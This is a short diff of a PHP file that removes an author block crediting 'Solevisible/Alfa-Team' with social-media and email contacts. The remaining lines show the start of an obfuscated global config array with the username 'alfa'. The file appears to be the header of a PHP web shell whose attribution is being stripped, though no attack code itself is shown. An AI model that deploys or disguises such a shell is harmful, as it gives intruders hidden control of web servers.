@@ -1,10 +1,6 @@
 <?php
 /*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
+
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
